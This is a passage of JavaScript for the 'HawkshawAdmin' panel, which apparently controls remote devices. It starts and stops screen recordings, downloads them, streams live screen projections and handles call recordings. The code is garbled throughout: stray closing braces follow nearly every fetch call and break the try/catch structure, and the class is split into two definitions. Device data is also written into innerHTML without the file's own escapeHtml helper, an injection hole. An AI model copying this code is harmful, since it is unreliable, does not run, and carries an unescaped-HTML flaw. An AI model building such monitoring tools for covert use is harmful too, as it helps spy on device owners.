                    'Authorization': `Bearer ${this.authToken}`
                }
                });
        }

            const data = await response.json();
            if (data.success) {
                document.getElementById('totalScreenRecordings').textContent = data.data.total || 0;
                document.getElementById('activeScreenRecordings').textContent = data.data.active || 0;
                document.getElementById('completedScreenRecordings').textContent = data.data.completed || 0;
            }
        } catch (error) {
            console.error('Error loading screen recording stats:', error);
        }
    }

    async startScreenRecording() {
        const deviceId = document.getElementById('screenRecordingDevice').value;
        const quality = document.getElementById('screenRecordingQuality').value;
        const duration = document.getElementById('screenRecordingDuration').value;
        const resolution = document.getElementById('screenRecordingResolution').value;

        if (!deviceId) {
            this.showAlert('Please select a device', 'warning');
            return;
        }

        try {
            const response = await fetch('/api/screen-recording/start', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.authToken}`
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    quality,
                    duration: parseInt(duration),
                    resolution: resolution || undefined
                })
                });
        }

            const data = await response.json();
            if (data.success) {
                this.showNotification('Screen recording started successfully', 'success');
            } else {
                this.showAlert('Failed to start screen recording: ' + data.message, 'danger');
            }
        } catch (error) {
            console.error('Start recording error:', error);
            this.showAlert('Start recording error: ' + error.message, 'danger');
        }
    }

    async stopScreenRecording() {
        const deviceId = document.getElementById('screenRecordingDevice').value;

        if (!deviceId) {
            this.showAlert('Please select a device', 'warning');
            return;
        }

        try {
            const response = await fetch('/api/screen-recording/stop', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.authToken}`
                },
                body: JSON.stringify({ device_id: deviceId })
                });
        }

            const data = await response.json();
            if (data.success) {
                this.showNotification('Screen recording stopped successfully', 'success');
            } else {
                this.showAlert('Failed to stop screen recording: ' + data.message, 'danger');
            }
        } catch (error) {
            console.error('Stop recording error:', error);
            this.showAlert('Stop recording error: ' + error.message, 'danger');
        }
    }

    async downloadScreenRecording(recordingId) {
        try {
            const response = await fetch(`/api/screen-recording/${recordingId}/download`, {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
                });
        }

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `screen_recording_${recordingId}.mp4`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                this.showNotification('Download started', 'success');
            } else {
                this.showAlert('Failed to download recording', 'danger');
            }
        } catch (error) {
            console.error('Download error:', error);
            this.showAlert('Download error: ' + error.message, 'danger');
        }
    }
}

class HawkshawAdmin {
    // Screen recording management
    async deleteScreenRecording(recordingId) {
        if (!confirm('Are you sure you want to delete this screen recording?')) {
            return;
        }

        try {
            const response = await fetch(`/api/screen-recording/${recordingId}`, {
                method: 'DELETE',
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
                });
        }

            const data = await response.json();
            if (data.success) {
                this.showNotification('Screen recording deleted successfully', 'success');
                this.loadScreenRecordings();
            } else {
                this.showAlert('Failed to delete recording', 'danger');
            }
        } catch (error) {
            console.error('Delete error:', error);
            this.showAlert('Delete error: ' + error.message, 'danger');
        }
    }

    // Screen Projection Methods
    async loadActiveProjections() {
        try {
            const response = await fetch('/api/screen-projection/active', {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
                });
        }

            const data = await response.json();
            if (data.success) {
                this.displayActiveProjections(data.data);
                this.updateProjectionStats();
            }
        } catch (error) {
            console.error('Error loading active projections:', error);
        }
    }

    displayActiveProjections(projections) {
        const container = document.getElementById('activeProjectionsContainer');
        if (!container) return;

        if (projections.length === 0) {
            container.innerHTML = `
                <div class="text-center text-muted py-4">
                    <i class="fas fa-desktop fa-3x mb-3"></i>
                    <p>No active projections</p>
                </div>
            `;
            return;
        }

        const cardsHtml = projections.map(projection => `
            <div class="col-md-6 mb-3">
                <div class="card">
                    <div class="card-body">
                        <h6 class="card-title">
                            <i class="fas fa-desktop"></i> ${projection.device_id}
                            <span class="badge bg-${this.getStatusColor(projection.status)} ms-2">${projection.status}</span>
                        </h6>
                        <p class="card-text">
                            <small class="text-muted">
                                Type: ${projection.projection_type} | 
                                Quality: ${projection.quality} | 
                                Viewers: ${projection.viewer_count}/${projection.max_viewers}
                            </small>
                        </p>
                        <div class="d-flex gap-2">
                            <button class="btn btn-sm btn-primary" onclick="hawkshawAdmin.joinProjection('${projection.session_id}')">
                                <i class="fas fa-eye"></i> View
                            </button>
                            <button class="btn btn-sm btn-danger" onclick="hawkshawAdmin.stopProjection('${projection.session_id}')">
                                <i class="fas fa-stop"></i> Stop
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `).join('');

        container.innerHTML = `<div class="row">${cardsHtml}</div>`;
    }

    async updateProjectionStats() {
        try {
            const response = await fetch('/api/screen-projection/stats', {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
                });
        }

            const data = await response.json();
            if (data.success) {
                document.getElementById('totalProjections').textContent = data.data.total || 0;
                document.getElementById('activeProjections').textContent = data.data.active || 0;
                document.getElementById('totalViewers').textContent = data.data.totalViewers || 0;
            }
        } catch (error) {
            console.error('Error loading projection stats:', error);
        }
    }

    async startScreenProjection() {
        const deviceId = document.getElementById('projectionDevice').value;
        const projectionType = document.getElementById('projectionType').value;
        const quality = document.getElementById('projectionQuality').value;
        const frameRate = document.getElementById('projectionFrameRate').value;
        const maxViewers = document.getElementById('maxViewers').value;

        if (!deviceId) {
            this.showAlert('Please select a device', 'warning');
            return;
        }

        try {
            const response = await fetch('/api/screen-projection/start', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.authToken}`
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    projection_type: projectionType,
                    quality,
                    frame_rate: parseInt(frameRate),
                    max_viewers: parseInt(maxViewers)
                })
                });
        }

            const data = await response.json();
            if (data.success) {
                this.showNotification('Screen projection started successfully', 'success');
                this.loadActiveProjections();
                // Auto-join the projection
                setTimeout(() => {
                    this.joinProjection(data.data.session_id, data.data.access_token);
                }, 1000);
            } else {
                this.showAlert('Failed to start screen projection: ' + data.message, 'danger');
            }
        } catch (error) {
            console.error('Start projection error:', error);
            this.showAlert('Start projection error: ' + error.message, 'danger');
        }
    }

    async stopProjection(sessionId) {
        try {
            const response = await fetch('/api/screen-projection/stop', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.authToken}`
                },
                body: JSON.stringify({ session_id: sessionId })
                });
        }

            const data = await response.json();
            if (data.success) {
                this.showNotification('Screen projection stopped successfully', 'success');
                this.loadActiveProjections();
            } else {
                this.showAlert('Failed to stop screen projection: ' + data.message, 'danger');
            }
        } catch (error) {
            console.error('Stop projection error:', error);
            this.showAlert('Stop projection error: ' + error.message, 'danger');
        }
    }

    async joinProjection(sessionId, accessToken = null) {
        try {
            // Join the projection room
            this.socket.emit('join-projection', sessionId);
            
            // Update the screen viewer
            const viewerContainer = document.getElementById('screenViewerContainer');
            if (viewerContainer) {
                viewerContainer.innerHTML = `
                    <div class="bg-dark rounded d-flex align-items-center justify-content-center" style="height: 400px;">
                        <div class="text-light">
                            <i class="fas fa-spinner fa-spin fa-2x mb-3"></i>
                            <p>Connecting to projection...</p>
                        </div>
                    </div>
                    <canvas id="screenCanvas" style="width: 100%; height: 400px; display: none;"></canvas>
                `;
            }

            this.showNotification('Joined projection session', 'success');
        } catch (error) {
            console.error('Join projection error:', error);
            this.showAlert('Join projection error: ' + error.message, 'danger');
        }
    }

    updateScreenFrame(data) {
        const canvas = document.getElementById('screenCanvas');
        const viewerContainer = document.getElementById('screenViewerContainer');
        
        if (!canvas || !viewerContainer) return;

        // Show canvas and hide loading message
        canvas.style.display = 'block';
        const loadingDiv = viewerContainer.querySelector('.bg-dark');
        if (loadingDiv) {
            loadingDiv.style.display = 'none';
        }

        const ctx = canvas.getContext('2d');
        const img = new Image();
        
        img.onload = function() {
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
        };
        
        img.src = 'data:image/jpeg;base64,' + data.frame_data;
    }

    getQualityColor(quality) {
        const colors = {
            'low': 'secondary',
            'medium': 'primary',
            'high': 'success',
            'ultra': 'warning'
        };
        return colors[quality] || 'secondary';
    }

    refreshCallRecordings() {
        this.loadCallRecordings();
    }

    loadCallRecordingsPage(page) {
        // TODO: Implement pagination
        console.log('Load page:', page);
    }

    formatDuration(seconds) {
        if (!seconds) return '0:00';
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        
        if (hours > 0) {
            return `${hours}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        return `${minutes}:${secs.toString().padStart(2, '0')}`;
    }
}

// Global functions for HTML onclick handlers
window.deleteScreenRecording = function(recordingId) {
    if (window.hawkshawAdmin) {
        window.hawkshawAdmin.deleteScreenRecording(recordingId);
    }
};

window.startScreenRecording = function() {
    if (window.hawkshawAdmin) {
        window.hawkshawAdmin.startScreenRecording();
    }
};

window.stopScreenRecording = function() {
    if (window.hawkshawAdmin) {
        window.hawkshawAdmin.stopScreenRecording();
    }
};

window.startScreenProjection = function() {
    if (window.hawkshawAdmin) {
        window.hawkshawAdmin.startScreenProjection();
    }
}

window.stopScreenProjection = function() {
    if (window.hawkshawAdmin) {
        const sessionId = prompt('Enter session ID to stop:');
        if (sessionId) {
            window.hawkshawAdmin.stopProjection(sessionId);
        }
    }
}

// Helper function to escape HTML
function escapeHtml(unsafe) {
    if (unsafe === null || unsafe === undefined) return '';
    return String(unsafe)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// Initialize admin panel when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    try {
        // Initialize the admin panel
        window.hawkshawAdmin = new HawkshawAdmin();
        
        // Global function for section navigation
        window.showSection = function(sectionId) {
            if (!sectionId) return;
            
            // Hide all sections
            document.querySelectorAll('.content-section').forEach(section => {
                if (section instanceof HTMLElement) {
                    section.classList.add('d-none');
                }
            });
            
            // Show the selected section
            const targetSection = document.getElementById(`${sectionId}-section`);
            if (targetSection) {
                targetSection.classList.remove('d-none');
            }
            
            // Update active navigation
            document.querySelectorAll('.nav-link').forEach(link => {
                if (link instanceof HTMLElement) {
                    const linkSection = link.getAttribute('data-section');
                    link.classList.toggle('active', linkSection === sectionId);
                }
            });
        };
    } catch (error) {
        console.error('Failed to initialize admin panel:', error);
        const errorDiv = document.createElement('div');
        errorDiv.className = 'alert alert-danger';
        errorDiv.textContent = 'Failed to initialize the admin panel. Please check the console for details.';
        document.body.prepend(errorDiv);
    }
});

// Make escapeHtml available globally
window.escapeHtml = escapeHtml;
